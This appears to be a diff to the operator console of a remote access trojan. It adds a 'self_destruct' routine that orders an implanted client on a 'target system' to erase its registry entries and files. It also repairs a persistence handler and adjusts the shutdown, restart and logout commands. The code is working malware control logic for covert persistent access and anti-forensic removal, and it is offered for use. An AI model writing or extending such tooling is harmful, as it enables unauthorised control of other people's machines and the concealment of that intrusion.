@@ -51,9 +51,8 @@ def recv_file(client, name=''):
     return True
 
 
-def persistence():
+def persistence(client):
     msg = (client.recv(10240)).decode()
-    print()
     print(msg)
     print()
 
@@ -312,6 +311,55 @@ def logout(client):
     print()
 
 
+def self_destruct(client, Id, ip):
+    print()
+    print(f"{g.r}           (                    (                                             ")
+    print(fr"{g.y}   _ _{g.r}     )\ )     (  (        )\ )            )                )     {g.y}_ _    ")
+    print(fr"{g.y} _| | |_{g.r}  (()/(   ( )\ )\ )    (()/(    (    ( /((     (      ( /(   {g.y}_| | |_  ")
+    print(fr"{g.y}|_  .  _|{g.r}  /(_)) ))((_|()/( ___ /(_))  ))\(  )\())(   ))\  (  )\()) {g.y}|_  .  _| ")
+    print(fr"{g.y}|_     _|{g.r} (_))  /((_)  /(_))___(_))_  /((_)\(_))(()\ /((_) )\(_))/  {g.y}|_     _| ")
+    print(fr"{g.y}  |_|_|{g.bl}   / __|{g.r}(_)){g.bl}| |{g.r}(_){g.bl} _|    |   \{g.r}(_))((_){g.bl} |_ {g.r}((_|_))( ((_){g.bl} |_     {g.y}|_|_|   ")
+    print(fr"{g.bl}          \__ \/ -_) | |  _|    | |) / -_|_-<  _| '_| || / _||  _|{g.e}            ")
+    print(fr"{g.bl}          |___/\___|_| |_|      |___/\___/__/\__|_|  \_,_\__| \__|{g.e}            ")
+    print()
+    print(f"{g.bl}┌─────────────────┐{g.e}")
+    print(f"{g.bl}│ {g.y}⚠ {g.r}!!{g.u}{g.b}WARNING{g.e}{g.r}!! {g.y}⚠ {g.bl}│{g.e}")
+    print(f"{g.bl}└─────────────────┘{g.e}")
+    print()
+    print(f"{g.bl}┌[ {g.p}# {g.r}!{g.y}Consequences{g.r}!  {g.p}# {g.bl}]{g.e}")
+    print(f"{g.bl}├{g.y}*{g.e} The following command will delete the client registry and program form the target system.")
+    print(f"{g.bl}├{g.y}*{g.e} This will result in closing the current session and connection to the mentioned client.")
+    print(f"{g.bl}├{g.y}*{g.e} By continuing you will not be able to connect to the mentioned system any further in the future.")
+    print(f"{g.bl}└{g.y}*{g.e} Connection/access to the mention system can only be gained again if client is reinstalled on the system.")
+    print()
+    ch = input(f"{g.y}Do you want to continue? {g.bl}[Y/N]{g.e}: ")
+    print()
+    if ch.upper() == 'Y':
+        conf = input(f"{g.r}The changes cannot be reverted back are you sure? {g.bl}[Y/N]{g.e}: ")
+        print()
+        if conf.upper() == 'Y':
+            print(f"{g.info} Performing self-destruct on client '{g.y}{Id}{g.e}' ({g.r}@{g.g}{ip}{g.e})...")
+            print()
+            client.send(b'self_destruct')
+            while True:
+                msg = (client.recv(10240)).decode()
+                if msg == '<END>':
+                    break
+                if msg[5:] == 'ERROR':
+                    print('[-]', msg)
+                    print()
+                    return False
+                print('[+]', msg)
+            print()
+            print(f"{g.info} Self-Destruction completed successfully")
+            print()
+            return True
+    print(f"{g.info} Cancelling self destruct...")
+    print(f"{g.info} Returning to normal behaviour")
+    print()
+    return False
+
+
 def send_command(client, Id, ip):
     print("Press Ctrl-c or enter 'exit'/'quit' to exit session\n\n")
     while not g.till:
@@ -335,7 +383,7 @@ def send_command(client, Id, ip):
                 clear_screen()
             elif command == 'add_persis':
                 client.send(command.encode())
-                persistence()
+                persistence(client=client)
             elif command == 'cwd':
                 client.send(command.encode())
                 get_cwd(client=client)
@@ -390,15 +438,19 @@ def send_command(client, Id, ip):
             elif command == 'shut':
                 client.send(command.encode())
                 shutdown(client=client)
+                return
             elif command == 'restrt':
                 client.send(command.encode())
                 restart(client=client)
+                return
             elif command == 'logout':
                 client.send(command.encode())
                 logout(client=client)
-            elif command == 'self_destruct':
-                print(f"{g.info} Initiated self destruct on '{Id}'")
                 return
+            elif command == 'self_destruct':
+                if self_destruct(client=client, Id=Id, ip=ip):
+                    input("Press enter to go back to shell...")
+                    return
             elif command in ['exit', 'quit']:
                 client.send(b'exit')
                 return
